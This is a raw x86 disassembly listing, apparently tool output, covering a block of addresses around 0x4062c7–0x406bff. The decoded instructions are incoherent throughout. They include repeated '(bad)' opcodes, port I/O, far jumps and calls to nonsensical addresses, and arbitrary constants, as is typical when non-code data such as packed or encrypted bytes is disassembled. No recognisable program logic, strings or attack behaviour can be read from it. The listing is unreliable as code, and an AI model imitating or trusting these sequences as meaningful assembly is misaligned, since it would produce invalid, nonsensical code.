  4062c7:	xor    DWORD PTR [ecx+0x75],eax
  4062ca:	inc    DWORD PTR [ecx+0x413212]
  4062d0:	mov    al,ds:0xd1328669
  4062d5:	add    DWORD PTR [eax+0x2],ebp
  4062d8:	nop
  4062d9:	add    DWORD PTR [eax-0x17f6f201],eax
  4062df:	rcl    DWORD PTR [ebp+0x7d68feeb],0x32
  4062e6:	inc    ecx
	...
  4062fb:	add    al,bh
  4062fd:	repnz xor DWORD PTR [ecx+0x60],eax
  406301:	imul   eax,DWORD PTR [ecx],0xff816000
  406307:	jne    0x406371
  406309:	jmp    0xebe860b7
  40630e:	rcl    DWORD PTR [bp+si+0x42],0xff
  406313:	addr16 in eax,0x31
  406316:	inc    ecx
  406317:	add    BYTE PTR [eax],ch
  406319:	add    al,BYTE PTR [eax]
  40631b:	add    al,dl
  40631d:	jmp    0xfffd:0x8eb80874
  406324:	mov    bh,0x63
  406326:	shl    BYTE PTR [edx],cl
  406328:	push   ecx
  406329:	cld    
  40632a:	lods   eax,DWORD PTR ds:[si]
  40632c:	loop   0x40636f
  40632e:	jmp    DWORD PTR [edi+0x22]
  406331:	add    DWORD PTR [eax],eax
  406333:	adc    BYTE PTR [edi-0x1b17f89b],0xed
  40633a:	(bad)  
  40633b:	(bad)  
  40633c:	clc    
  40633d:	fdiv   DWORD PTR [ecx]
  40633f:	inc    ecx
  406340:	loopne 0x4063aa
  406342:	lods   al,BYTE PTR ds:[esi]
  406343:	xor    ah,BYTE PTR [ecx-0x2ffd9800]
  406349:	add    BYTE PTR [eax-0x17f76201],al
  40634f:	gs and eax,0x3d68feeb
  406355:	xor    al,BYTE PTR [ecx+0x0]
  406358:	test   al,0x9d
  40635a:	xor    al,BYTE PTR [ecx+0x39]
  40635d:	addr16 jmp 0x406361
	...
  406374:	cmp    DWORD PTR [edi-0x7d],esp
  406377:	jmp    DWORD PTR [edi+ebp*2]
  40637a:	imul   ecx,DWORD PTR [esi-0x5c],0x75
  40637e:	je     0x4063ea
  406380:	inc    ebx
  406381:	outs   dx,BYTE PTR ds:[esi]
  406382:	out    dx,al
  406383:	pop    es
  406384:	mov    eax,ds:0x8eff755f
  406389:	shl    BYTE PTR [eax],1
  40638b:	dec    DWORD PTR [edi+ebp*2]
  40638e:	imul   edi,edi,0x7c
  406391:	dec    ebp
  406392:	je     0x4063fe
  406394:	push   ebp
  406395:	inc    esi
  406396:	out    dx,al
  406397:	pop    es
  406398:	popa   
  406399:	mov    bl,0x76
  40639b:	jmp    DWORD PTR [esi-0x4b]
  40639e:	out    dx,al
  40639f:	sti    
  4063a0:	pop    esi
  4063a1:	xor    ecx,DWORD PTR [eax+ebp*8]
  4063a4:	into   
  4063a5:	call   0xffff:0xa880ff74
  4063ac:	in     eax,dx
  4063ad:	icebp  
  4063ae:	cmp    WORD PTR [edx+ebx*2+0x19a7403],0x2e
  4063b7:	xor    edi,DWORD PTR [eax+0x69]
  4063ba:	je     0x406431
  4063bc:	xor    eax,0x1ec9f591
  4063c1:	jmp    0x406395
  4063c3:	cmp    DWORD PTR [bx+di+0x64],ebp
  4063c7:	mov    esi,0x7edda69
  4063cc:	adc    DWORD PTR [eax-0x3e010095],esp
  4063d2:	inc    edi
  4063d3:	(bad)  
  4063d4:	test   dl,0xea
  4063d7:	inc    esi
	...
  4063ec:	sub    ch,BYTE PTR [eax+0x656cff03]
  4063f2:	imul   ebx,DWORD PTR [ebp-0xd],0x2a
  4063f6:	je     0x406448
  4063f8:	popa   
  4063f9:	push   0x8fef03
  4063fe:	mov    ecx,0x11084c74
  406403:	call   0x3ae3:0x6b1673d1
  40640a:	push   cs
  40640b:	je     0x40642e
  40640d:	(bad)  
  40640e:	mov    ecx,0x7472a6c2
  406413:	pop    es
  406414:	xchg   ecx,eax
  406415:	xor    al,0x23
  406417:	je     0x4063af
  406419:	rol    BYTE PTR [eax-0x589cc6ff],1
  40641f:	aam    0x87
  406421:	in     eax,dx
  406422:	lock pop ebx
  406424:	add    DWORD PTR [eax-0x2a],ebp
  406427:	jae    0x40648a
  406429:	mov    DWORD PTR [edi-0x54b6918d],esp
  40642f:	cld    
  406430:	data16 int3 
  406432:	jno    0x406494
  406434:	pop    esi
  406435:	in     eax,dx
  406436:	in     al,0x5b
  406438:	add    BYTE PTR [esi-0x52],0x73
  40643c:	inc    edx
  40643d:	inc    eax
  40643e:	sbb    eax,0xda26d10e
  406443:	les    edi,FWORD PTR [esi]
  406445:	ret    
  406446:	adc    dl,0x0
  406449:	jae    0x4063d9
  40644b:	aam    0x7e
  40644d:	jae    0x40644b
  40644f:	sti    
	...
  406464:	push   ds
  406465:	in     al,0x7d
  406467:	jae    0x406487
  406469:	push   0x73164a15
  40646e:	mov    al,ds:0xbc004146
  406473:	jle    0x40648a
  406475:	jg     0x40649c
  406477:	fs xchg ebx,eax
  406479:	add    BYTE PTR [esi-0x7],dl
  40647c:	inc    esi
  40647d:	jae    0x406453
  40647f:	(bad)  
  406480:	out    dx,eax
  406481:	sub    al,0xbc
  406483:	sbb    al,0x78
  406485:	add    BYTE PTR [ecx-0x25],dl
  406488:	icebp  
  406489:	jb     0x40648b
  40648b:	ss push esp
  40648d:	mov    ebp,0x733ac3f3
  406492:	jne    0x406491
  406494:	dec    ebx
  406495:	in     eax,dx
  406496:	or     ebx,DWORD PTR [esi]
  406498:	add    ch,ch
  40649a:	sub    BYTE PTR [eax+0x2041683a],ch
  4064a0:	sub    dh,BYTE PTR [ebx-0x77]
  4064a3:	lods   al,BYTE PTR ds:[esi]
  4064a4:	push   ss
  4064a5:	out    0xff,al
  4064a7:	std    
  4064a8:	mov    eax,ds:0x967cff0a
  4064ad:	jno    0x4064e4
  4064af:	je     0x4064de
  4064b1:	sar    edi,0xd0
  4064b4:	daa    
  4064b5:	dec    ecx
  4064b6:	(bad)  
  4064b7:	fdivp  st(5),st
  4064b9:	mov    esp,0x5a8164f7
  4064be:	push   eax
  4064bf:	into   
  4064c0:	jno    0x4064d8
  4064c2:	(bad)  
  4064c3:	cmp    al,0x39
  4064c5:	jae    0x4064fc
  4064c7:	xor    al,0x0
	...
  4064d9:	add    BYTE PTR [eax],al
  4064db:	add    BYTE PTR [ecx+eax*8],bh
  4064de:	inc    eax
  4064e0:	das    
  4064e1:	dec    ecx
  4064e2:	jmp    FWORD PTR [esi+0x13efbccd]
  4064e8:	cmp    eax,0xcbc97573
  4064ed:	in     al,dx
  4064ee:	or     edx,DWORD PTR [esi+0x2828eb71]
  4064f4:	xor    eax,0xabb1fd68
  4064f9:	jno    0x406484
  4064fb:	and    al,0x99
  4064fd:	add    DWORD PTR [ebp-0x77],0xffffffea
  406501:	jb     0x406578
  406503:	lds    ecx,FWORD PTR [ebx+0x41660beb]
  406509:	jmp    0x406533
  40650b:	test   al,0x3a
  40650d:	push   0x716b21e5
  406512:	mov    DWORD PTR [esi+edx*2+0x7c007d7d],esp
  406519:	std    
  40651a:	push   cs
  40651b:	test   BYTE PTR [ebp+edi*8+0x7063ffff],al
  406522:	test   DWORD PTR [eax],0x8a79ef
  406528:	sar    ch,1
  40652a:	cmp    BYTE PTR [ebp+0x24],0xfd
  40652e:	push   cs
  40652f:	test   BYTE PTR [eax],ah
  406531:	std    
  406532:	(bad)  
  406533:	(bad)  
  406534:	aas    
  406535:	js     0x40655e
  406537:	jmp    DWORD PTR ds:0x522ae775
  40653d:	out    dx,al
  40653e:	(bad)  
  40653f:	inc    DWORD PTR [eax]
	...
  406551:	add    BYTE PTR [eax],al
  406553:	add    BYTE PTR ds:0x9875fee1,dl
  406559:	aad    0x80
  40655b:	ret    0xef9f
  40655e:	(bad)  
  40655f:	jne    0x4064f9
  406561:	out    dx,eax
  406562:	je     0x40656c
  406564:	js     0x4065dc
  406566:	sar    edi,0x7f
  406569:	out    dx,eax
  40656a:	je     0x406560
  40656c:	jg     0x4065d7
  40656e:	pop    es
  40656f:	call   0x3f1f7f
  406574:	loope  0x4065d6
  406576:	daa    
  406577:	adc    esp,DWORD PTR [eax-0x20]
  40657a:	mov    ebp,0x74f04d75
  40657f:	lock lahf 
  406581:	imul   eax,DWORD PTR [edi],0xfeba77e8
  406587:	(bad)  
  406588:	mov    ebx,0xc875fefd
  40658d:	out    dx,al
  40658e:	je     0x406580
  406590:	lahf   
  406591:	imul   eax,DWORD PTR [edi],0xfebaebe8
  406597:	call   FWORD PTR [edi-0x1a001497]
  40659d:	je     0x406586
  40659f:	cmp    al,0x52
  4065a1:	out    dx,eax
  4065a2:	inc    BYTE PTR [ebx+0x674c39]
  4065a8:	gs ins BYTE PTR es:[edi],dx
  4065aa:	test   BYTE PTR [ebp-0x27],bh
  4065ad:	(bad)  
  4065ae:	test   BYTE PTR [esi],0xb2
  4065b1:	fwait
  4065b2:	dec    DWORD PTR [bx+di]
  4065b5:	sub    dh,bh
  4065b7:	pop    es
	...
  4065cc:	loope  0x4065f5
  4065ce:	inc    ebx
  4065cf:	inc    esi
  4065d1:	or     eax,0x123969fe
  4065d6:	test   DWORD PTR [edi],0xff42d3a1
  4065dc:	scas   al,BYTE PTR es:[edi]
  4065dd:	add    edi,esi
  4065df:	repz xchg ecx,eax
  4065e1:	inc    edx
  4065e2:	inc    esi
  4065e3:	call   FWORD PTR [esi-0x5e04098f]
  4065e9:	dec    edx
  4065ea:	inc    esi
  4065eb:	dec    DWORD PTR [esi-0x6e08099f]
  4065f1:	jb     0x406639
  4065f3:	(bad)  
  4065f4:	jle    0x406647
  4065f6:	imul   bh
  4065f8:	popa   
  4065f9:	pop    edx
  4065fa:	inc    esi
  4065fb:	jmp    FWORD PTR [esi+0x41]
  4065fe:	imul   bl
  406600:	push   ecx
  406601:	bound  eax,QWORD PTR [esi-0x1]
  406604:	pop    esi
  406605:	mov    cl,0xf6
  406607:	jecxz  0x40666a
  406609:	stos   BYTE PTR es:[edi],al
  40660a:	inc    edi
  40660b:	dec    DWORD PTR [esi-0x61]
  40660e:	inc    ebp
  40660f:	and    al,0x39
  406611:	xor    al,0x7d
  406613:	in     al,dx
  406614:	mov    eax,0x36f7739a
  406619:	xchg   edi,eax
  40661a:	fist   DWORD PTR [edx]
  40661c:	cmp    esi,ebp
  40661e:	mov    al,0x68
  406620:	clc    
  406621:	stos   BYTE PTR es:[edi],al
  406622:	ret    0x96ff
  406625:	aaa    
  406626:	xor    al,0x41
  406628:	cmp    DWORD PTR [ecx],eax
  40662a:	mov    bl,0x33
  40662c:	js     0x406687
  40662e:	(bad)  [esi+0x0]
	...
  406644:	dec    edx
  406645:	add    BYTE PTR [eax+0x1aa29103],ch
  40664b:	ret    
  40664c:	mul    bh
  40664e:	test   BYTE PTR [eax+edi*2],dh
  406651:	add    BYTE PTR [esi-0xa],cl
  406654:	xor    ch,BYTE PTR [edi-0x44]
  406657:	sti    
  406658:	(bad)  
  406659:	fnstcw WORD PTR [esi]
  40665b:	jo     0x406633
  40665d:	fcomp  st(1)
  40665f:	add    ebx,esi
  406661:	scas   al,BYTE PTR es:[edi]
  406662:	rol    DWORD PTR ds:0xdbe8c10d,0xbd
  406669:	xor    ebp,DWORD PTR [eax-0x258edefd]
  40666f:	ret    0xe7ae
  406672:	das    
  406673:	xor    al,0xf8
  406675:	call   DWORD PTR [eax-0x173e95c2]
  40667b:	fistp  DWORD PTR [ebp-0x71fc57cd]
  406681:	cmc    
  406682:	fdiv   QWORD PTR [eax+0xc]
  406685:	clc    
  406686:	shr    BYTE PTR [ebx],1
  406688:	jg     0x4066f9
  40668a:	(bad)  
  40668c:	dec    edx
  40668d:	add    dh,al
  40668f:	scas   al,BYTE PTR es:[edi]
  406690:	loope  0x406673
  406692:	adc    al,0xc5
  406694:	out    0x17,ax
  406697:	cmp    al,bh
  406699:	call   DWORD PTR [eax-0x3c]
  40669c:	or     al,cl
  40669e:	call   0x2874937e
  4066a3:	add    al,0xd1
  4066a5:	cld    
  4066a6:	fadd   st(4),st
	...
  4066bc:	ds out 0xcd,eax
  4066bf:	aaa    
  4066c0:	js     0x4066c2
  4066c2:	xchg   esi,eax
  4066c3:	stc    
  4066c4:	inc    edx
  4066c5:	outs   dx,DWORD PTR ds:[esi]
  4066c6:	adc    al,0xfc
  4066c8:	push   ds
  4066c9:	std    
  4066ca:	xchg   BYTE PTR [edi+0x1e],ch
  4066cd:	jge    0x4066f3
  4066cf:	jo     0x40673a
  4066d1:	outs   dx,DWORD PTR ds:[esi]
  4066d2:	add    ah,bh
  4066d4:	push   cs
  4066d5:	outs   dx,BYTE PTR ds:[esi]
  4066d6:	xor    eax,0xffc125f4
  4066db:	push   eax
  4066dc:	retf   0x95
  4066df:	jmp    0xd3b615d7
  4066e4:	ja     0x4066ab
  4066e6:	imul   ecx
  4066e8:	cmp    al,BYTE PTR [eax]
  4066ea:	add    BYTE PTR [esi],ch
  4066ec:	lock jb 0x4066ee
  4066ef:	out    0x3a,al
  4066f1:	add    BYTE PTR [edx-0x17],ch
  4066f4:	lock outs dx,BYTE PTR ds:[esi]
  4066f6:	imul   ebp,ecx,0xac8c6ee0
  4066fc:	inc    esi
  4066fd:	ror    BYTE PTR [esp+eiz*2+0x16ff7731],1
  406704:	test   DWORD PTR [ebp+0x75],ebp
  406707:	adc    DWORD PTR [esi],edx
  406709:	cmc    
  40670a:	sti    
  40670b:	adc    DWORD PTR [esi+edx*4],ebx
  40670e:	add    cl,ch
  406710:	xchg   ebx,eax
  406711:	scas   al,BYTE PTR es:[edi]
  406712:	je     0x4066ff
  406714:	repz mov edi,0xc1250767
  40671a:	jmp    ebp
  40671c:	cmp    edx,0x8ee7
	...
  406732:	add    BYTE PTR [eax],al
  406734:	jmp    FWORD PTR [esi-0x1]
  406737:	bound  ecx,QWORD PTR [edx]
  406739:	jge    0x4066c0
  40673b:	aad    0xef
  40673d:	outs   dx,BYTE PTR ds:[esi]
  40673e:	call   FWORD PTR [ecx]
  406740:	mov    esp,DWORD PTR [esi-0xc]
  406743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406744:	out    0x6e,eax
  406746:	mov    DWORD PTR [edx+ecx*8+0x76],ebp
  40674a:	jmp    FWORD PTR [esi-0x610f4b29]
  406750:	iret   
  406751:	outs   dx,BYTE PTR ds:[esi]
  406752:	call   DWORD PTR [esi*1-0x60680a9a]
  406759:	ins    DWORD PTR es:[edi],dx
  40675a:	call   DWORD PTR [edx+ebp*4+0x75]
  40675e:	inc    DWORD PTR [eax]
  406760:	mov    bh,0xc9
  406762:	loope  0x406727
  406764:	xchg   edi,eax
  406765:	fdivp  st(6),st
  406767:	inc    ebp
  406768:	mov    dl,cl
  40676a:	xchg   esp,eax
  40676b:	dec    DWORD PTR ds:0x7e2fe7de
  406771:	add    DWORD PTR [eax],eax
  406773:	leave  
  406774:	and    ch,BYTE PTR [ecx-0x1]
  406777:	push   esp
  406778:	pop    ebx
  406779:	int    0x82
  40677b:	les    esi,FWORD PTR [edi+eax*2-0x1]
  40677f:	imul   ecx,esi,0x680874de
  406785:	idiv   BYTE PTR [edi+0x44ec07ff]
  40678b:	cld    
  40678c:	clc    
  40678d:	dec    esp
  40678e:	xor    al,BYTE PTR [ecx-0x30]
  406791:	fidiv  WORD PTR [eax+ecx*1+0x48]
  406795:	mov    dh,0xfe
  406797:	inc    DWORD PTR [eax]
	...
  4067a9:	add    BYTE PTR [eax],al
  4067ab:	add    BYTE PTR [edi+0x47],al
  4067ae:	jmp    DWORD PTR [edi+0x2e]
  4067b1:	xor    al,BYTE PTR [ecx+0x0]
  4067b4:	enter  0x324c,0x41
  4067b8:	mov    al,ds:0x797534de
  4067bd:	inc    esp
  4067be:	jmp    edi
  4067c0:	inc    eax
  4067c1:	ret    
  4067c2:	(bad)  
  4067c3:	dec    DWORD PTR [ebx+0x300f73c1]
  4067c9:	push   esp
  4067ca:	(bad)  
  4067cb:	jne    0x406825
  4067cd:	leave  
  4067ce:	xchg   esp,eax
  4067cf:	cld    
  4067d0:	ja     0x4067ad
  4067d2:	out    0x85,eax
  4067d4:	xchg   ebx,eax
  4067d5:	(bad)  
  4067d7:	push   0x60
  4067d9:	dec    ecx
  4067da:	out    0x28,eax
  4067dc:	and    DWORD PTR [eax+ebp*2],eax
  4067df:	jl     0x406824
  4067e1:	inc    edx
  4067e2:	(bad)  
  4067e3:	(bad)  
  4067e4:	pop    ebp
  4067e5:	jbe    0x40680f
  4067e7:	inc    ecx
  4067e8:	and    cl,cl
  4067ea:	test   esi,eax
  4067ec:	cmp    DWORD PTR [esi+0x12f90b6d],edx
  4067f2:	std    
  4067f3:	dec    edi
  4067f4:	mov    DWORD PTR [esi+0x122107f7],eax
  4067fa:	jo     0x4067fb
  4067fc:	push   cs
  4067fd:	jg     0x4067c8
  4067ff:	ret    0xde06
  406802:	fcos   
  406804:	xchg   esi,eax
  406805:	in     eax,dx
  406806:	xor    BYTE PTR [ecx+0x39],al
  406809:	dec    edi
  40680a:	fidiv  DWORD PTR [edx]
  40680c:	js     0x406865
  40680e:	fild   DWORD PTR [ecx]
	...
  406824:	cmp    DWORD PTR [edi-0x7d],edx
  406827:	call   0xffad85a8
  40682c:	inc    edx
  40682d:	pop    ss
  40682e:	clc    
  40682f:	push   cs
  406830:	imul   eax,DWORD PTR [edi-0x40ce8a94],0x25befbc1
  40683a:	pop    esp
  40683b:	xor    bh,BYTE PTR [edx+0xd]
  40683e:	ins    DWORD PTR es:[edi],dx
  40683f:	push   0x39
  406841:	jg     0x40689e
  406843:	sub    al,bh
  406845:	push   esi
  406846:	fstp   TBYTE PTR [ebx+0x6a]
  406849:	cwde   
  40684a:	add    ebp,DWORD PTR [eax+0x3b]
  40684d:	push   edi
  40684e:	add    eax,DWORD PTR [eax-0xba555f]
  406854:	xchg   BYTE PTR [ecx+0x43],ah
  406857:	je     0x406887
  406859:	daa    
  40685a:	aam    0xfe
  40685c:	in     al,dx
  40685d:	outs   dx,BYTE PTR ds:[esi]
  40685e:	pop    ebx
  40685f:	sbb    DWORD PTR [ebp+0x55],ebp
  406862:	ins    BYTE PTR es:[edi],dx
  406863:	call   0xffad0298
  406868:	shl    DWORD PTR [eax+0x6c],cl
  40686b:	jne    0x4068ae
  40686d:	dec    edi
  40686e:	jmp    0xd9f5b76e
  406873:	and    al,BYTE PTR [esi+0x33]
  406876:	cld    
  406877:	out    0xc9,eax
  406879:	jmp    DWORD PTR [esp+ebp*2+0x6cfcd736]
  406880:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406881:	clc    
  406882:	and    ch,0x22
  406885:	ins    BYTE PTR es:[edi],dx
  406886:	mov    gs,WORD PTR [eax+eax*1+0x0]
	...
  40689a:	add    BYTE PTR [eax],al
  40689c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40689d:	ins    BYTE PTR es:[edi],dx
  40689e:	xchg   dh,dh
  4068a0:	ds pop eax
  4068a2:	pop    ds
  4068a3:	inc    esp
  4068a4:	push   cs
  4068a5:	ins    BYTE PTR es:[edi],dx
  4068a6:	mov    al,ds:0x14003d41
  4068ab:	jns    0x4068ba
  4068ad:	sub    BYTE PTR ds:0xd2d38f6f,0x3
  4068b4:	arpl   WORD PTR [ebx],ax
  4068b6:	push   esi
  4068b7:	idiv   BYTE PTR [esi]
  4068b9:	pop    eax
  4068ba:	jmp    0x70ac4702
  4068bf:	(bad)  
  4068c0:	shl    BYTE PTR [edi-0xc],cl
  4068c3:	jge    0x4068e6
  4068c5:	shr    eax,0x78
  4068c8:	add    al,0x8e
  4068ca:	add    ebx,eax
  4068cc:	mov    esi,0x2d03e5eb
  4068d1:	out    dx,eax
  4068d2:	nop
  4068d3:	lock push 0xffffffc1
  4068d6:	call   0x740607af
  4068db:	add    edi,DWORD PTR [ecx]
  4068dd:	imul   DWORD PTR [eax]
  4068df:	div    DWORD PTR [edi]
  4068e1:	rcl    BYTE PTR [eax],cl
  4068e3:	fild   DWORD PTR [edx+0x1ed2f66b]
  4068e9:	add    cl,ch
  4068eb:	pop    esp
  4068ec:	mov    edi,0xf83075d8
  4068f1:	(bad)  
  4068f2:	cmp    BYTE PTR [ebx-0x1c],ch
  4068f5:	test   eax,0xce6b5fce
  4068fb:	pop    esp
  4068fc:	mov    bh,0x3e
  4068fe:	(bad)  
  4068ff:	imul   eax,DWORD PTR [eax],0x0
	...
  406912:	add    BYTE PTR [eax],al
  406914:	loope  0x406896
  406916:	cmc    
  406917:	les    ecx,FWORD PTR [esi-0x2e]
  40691a:	inc    eax
  40691c:	sub    dl,BYTE PTR [ebp-0x54c01700]
  406922:	je     0x40692a
  406924:	or     esp,DWORD PTR [ebx+0x3a]
  406927:	lods   eax,DWORD PTR ds:[esi]
  406928:	mov    ds:0x3d01506b,al
  40692d:	add    bh,ch
  40692f:	dec    edi
  406930:	std    
  406931:	jns    0x406967
  406933:	sub    BYTE PTR ds:0x12f4fed0,bh
  406939:	arpl   WORD PTR [esi+ecx*4],bp
  40693c:	xchg   edx,eax
  40693d:	imul   ebp,eax,0x11
  406940:	ja     0x4069ad
  406942:	call   DWORD PTR [edx+0x3c]
  406945:	ret    0x1f7f
  406948:	xor    eax,0x5eaff9f5
  40694d:	das    
  40694e:	rcl    BYTE PTR [eax+0x46ff6b52],0x4f
  406955:	call   0xbcff:0x7bc9e638
  40695c:	pop    esi
  40695d:	imul   esi,DWORD PTR [ebp-0x1f],0x62
  406961:	mov    ah,0xbf
  406963:	es and cl,bl
  406966:	pop    ebp
  406967:	xor    bh,dh
  406969:	add    eax,DWORD PTR [eax]
  40696b:	mov    esp,0xe9685c27
  406970:	cmp    bl,BYTE PTR [ebx-0x42]
  406973:	xchg   ecx,eax
  406974:	int    0x33
  406976:	inc    ecx
  406977:	jmp    0x40697c
	...
  40698c:	and    esi,ebp
  40698e:	or     esi,esi
  406990:	mov    DWORD PTR [edx],eax
  406992:	call   0xffab849d
  406997:	push   ecx
  406998:	cmp    al,0x0
  40699a:	out    dx,eax
  40699b:	lahf   
  40699c:	xchg   edx,eax
  40699d:	mov    ah,0x34
  40699f:	sub    BYTE PTR ds:0xd3dd756b,bh
  4069a5:	hlt    
  4069a6:	pop    es
  4069a7:	add    BYTE PTR [eax-0x2c],ch
  4069aa:	in     eax,0xff
  4069ac:	(bad)  
  4069ad:	sub    eax,edx
  4069af:	or     BYTE PTR [eax+0x4f],dl
  4069b2:	mov    ch,ah
  4069b4:	(bad)  
  4069b5:	outs   dx,DWORD PTR ds:[esi]
  4069b6:	or     ebp,eax
  4069b8:	arpl   WORD PTR [esi-0x41d40002],di
  4069be:	jae    0x4069da
  4069c0:	cmp    BYTE PTR [ecx+0x34],bh
  4069c3:	inc    ecx
  4069c4:	adc    BYTE PTR [esi-0x19],cl
  4069c7:	fsub   st,st(5)
  4069c9:	(bad)  
  4069ca:	(bad)  
  4069cb:	push   eax
  4069cc:	xor    ch,dl
  4069ce:	je     0x4069d8
  4069d0:	mov    eax,0x8fffff8a
  4069d5:	(bad)
  4069d8:	pop    edi
  4069d9:	(bad)  
  4069da:	enter  0xe8c2,0xfd
  4069de:	push   esp
  4069df:	mov    edi,DWORD PTR [edx+eax*4-0x3c]
  4069e3:	cld    
  4069e4:	cli    
  4069e5:	std    
  4069e6:	imul   ecx,DWORD PTR [eax],0xe807707f
  4069ec:	js     0x406985
  4069ee:	(bad)  
  4069ef:	inc    DWORD PTR [eax]
	...
  406a01:	add    BYTE PTR [eax],al
  406a03:	add    BYTE PTR [ecx+0x40],bl
  406a06:	sti    
  406a07:	push   0xffffffd0
  406a09:	inc    ebp
  406a0a:	lea    esi,ds:0xbb67fde1
  406a10:	test   BYTE PTR [edi+edi*8-0x2],al
  406a14:	test   DWORD PTR [eax+0x28],esi
  406a17:	inc    ecx
  406a18:	nop
  406a19:	lds    edi,FWORD PTR [ebp+0xad63fc4]
  406a1f:	rol    BYTE PTR [ecx+edi*8],0x4f
  406a23:	push   0xbeeefd91
  406a28:	mov    al,ds:0x880874d6
  406a2d:	popa   
  406a2e:	loop   0x406a2f
  406a30:	(bad)  
  406a31:	int3   
  406a32:	(bad)  
  406a33:	sar    DWORD PTR [ecx],0x52
  406a36:	imul   ebp,DWORD PTR [edx+0x39],0xf83579bf
  406a3d:	push   esi
  406a3e:	fcmovnu st,st(7)
  406a40:	add    eax,0xcff0418
  406a45:	sub    al,0x1b
  406a47:	inc    ecx
  406a48:	cmp    DWORD PTR [edi],edi
  406a4a:	jns    0x406a10
  406a4c:	mov    ss:0x73a5bffd,al
  406a52:	shl    DWORD PTR [edi+0x38],cl
  406a55:	push   edi
  406a56:	pop    eax
  406a57:	mov    esi,0x7ef7a89
  406a5c:	and    DWORD PTR [ecx],esi
  406a5e:	dec    DWORD PTR gs:[esi]
  406a61:	(bad)
  406a65:	repnz (bad) 
	...
  406a7c:	xchg   esi,eax
  406a7d:	mov    ecx,0x4f39412e
  406a82:	or     eax,0x68577835
  406a87:	xor    eax,0xffc3006c
  406a8c:	(bad)  
  406a8d:	ss aas 
  406a8f:	call   esi
  406a91:	ins    DWORD PTR es:[edi],dx
  406a92:	inc    ebx
  406a93:	je     0x406ad3
  406a95:	xchg   ebx,edx
  406a97:	dec    BYTE PTR [edi+ebx*2+0x5b]
  406a9b:	or     bh,BYTE PTR [esi+0x6ce86919]
  406aa1:	sbb    BYTE PTR [ecx-0x1],ch
  406aa4:	and    edx,DWORD PTR [edi-0x25]
  406aa7:	popf   
  406aa8:	ins    BYTE PTR es:[edi],dx
  406aa9:	cwde   
  406aaa:	add    ebp,DWORD PTR [eax-0x5]
  406aad:	push   ebx
  406aae:	ret    0x97ff
  406ab1:	stos   DWORD PTR es:[edi],eax
  406ab2:	out    dx,al
  406ab3:	sub    al,bh
  406ab5:	push   esi
  406ab6:	pop    ebx
  406ab7:	ss jge 0x406b2b
  406aba:	push   0xf7f2790b
  406abf:	dec    edi
  406ac0:	or     DWORD PTR [eax],eax
  406ac2:	out    0xee,al
  406ac4:	ss pop eax
  406ac6:	leave  
  406ac7:	imul   esp,DWORD PTR [esi+0x68],0x6879fcc1
  406ace:	into   
  406acf:	fst    QWORD PTR [esi-0x20]
  406ad2:	lea    ebp,[esi]
  406ad4:	clc    
  406ad5:	call   DWORD PTR [eax-0x17]
  406ad8:	or     eax,0x468e8bf
  406add:	repz inc edx
	...
  406af4:	ss pusha 
  406af6:	cmc    
  406af7:	aas    
  406af8:	cs push 0xf7ad43f2
  406afe:	cmp    ah,dl
  406b00:	pop    ds
  406b01:	out    dx,al
  406b02:	loopne 0x406b5f
  406b04:	iret   
  406b05:	data16 xchg BYTE PTR [eax+0x21],ch
  406b09:	bound  ebp,QWORD PTR [ecx-0x2b24f998]
  406b0f:	push   0x4b80f884
  406b14:	mul    DWORD PTR [edi+0x66]
  406b17:	fst    QWORD PTR [eax+0x67]
  406b1a:	aam    0xfb
  406b1c:	fidiv  WORD PTR [esi]
  406b1e:	push   edi
  406b1f:	push   0x6909dade
  406b24:	dec    esp
  406b25:	clc    
  406b26:	push   eax
  406b27:	aas    
  406b28:	iret   
  406b29:	addr16 ds push 0xee36644c
  406b30:	ss pop eax
  406b32:	imul   DWORD PTR [ecx+0x453067b6]
  406b38:	xor    eax,0x957cb400
  406b3d:	addr16 pushf 
  406b3f:	not    DWORD PTR [esi-0x6997da98]
  406b45:	sti    
  406b46:	sub    bh,ch
  406b48:	cld    
  406b49:	xlat   BYTE PTR ds:[ebx]
  406b4a:	inc    eax
  406b4b:	cs clc 
  406b4d:	(bad)  
  406b4e:	call   FWORD PTR [eax-0x113b8b1e]
  406b54:	fmulp  st(7),st
  406b56:	dec    edi
  406b57:	cmp    DWORD PTR [eax],eax
	...
  406b69:	add    BYTE PTR [eax],al
  406b6b:	add    BYTE PTR [ebp-0x60310099],cl
  406b71:	fdiv   DWORD PTR [edx+0x4f67741c]
  406b77:	into   
  406b78:	dec    eax
  406b79:	jmp    edi
  406b7b:	sbb    bl,al
  406b7d:	jmp    WORD PTR [ecx]
  406b80:	add    BYTE PTR gs:[eax],al
  406b83:	(bad)  
  406b84:	xchg   edi,eax
  406b85:	fadd   st,st(1)
  406b87:	hlt    
  406b88:	std    
  406b89:	dec    di
  406b8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b8c:	sub    bh,bh
  406b8e:	out    0xde,eax
  406b90:	cdq    
  406b91:	push   DWORD PTR [bx+di]
  406b94:	std    
  406b95:	add    BYTE PTR [eax],al
  406b97:	jle    0x406b78
  406b99:	xlat   BYTE PTR ds:[ebx]
  406b9a:	iret   
  406b9b:	mov    esp,0x7e4f66f5
  406ba0:	or     bh,bh
  406ba2:	out    0xc2,eax
  406ba4:	cdq    
  406ba5:	inc    DWORD PTR [bx+di-0x58fa]
  406baa:	jmp    DWORD PTR [esi+0x2c]
  406bad:	inc    edx
  406bae:	or     cl,ch
  406bb0:	or     DWORD PTR [edx-0x14],edi
  406bb3:	push   0x79
  406bb5:	fs push 0xffffffe9
  406bb8:	lock idiv esi
  406bbb:	mov    esp,0x7c795ed2
  406bc0:	pop    esi
  406bc1:	mov    DWORD PTR [si-0x25aa],ebp
  406bc6:	sbb    DWORD PTR [esi],ebp
  406bc8:	test   al,0xfe
  406bca:	out    0x69,eax
  406bcc:	push   ss
  406bcd:	call   DWORD PTR [bp+di+0x0]
	...
  406be2:	add    BYTE PTR [eax],al
  406be4:	pop    ebx
  406be5:	addr16 jne 0x406bc9
  406be8:	add    ch,dh
  406bea:	dec    BYTE PTR [esi]
  406bec:	push   ds
  406bed:	ficomp DWORD PTR [ebx]
  406bef:	add    BYTE PTR [edi],dh
  406bf1:	jno    0x406bfa
  406bf3:	call   0x3f49ac
  406bf8:	xchg   DWORD PTR [edi-0x5],ebp
  406bfb:	(bad)  
  406bfc:	in     eax,dx
  406bfd:	push   0xffffffe7
  406bff:	xchg   ebx,eax
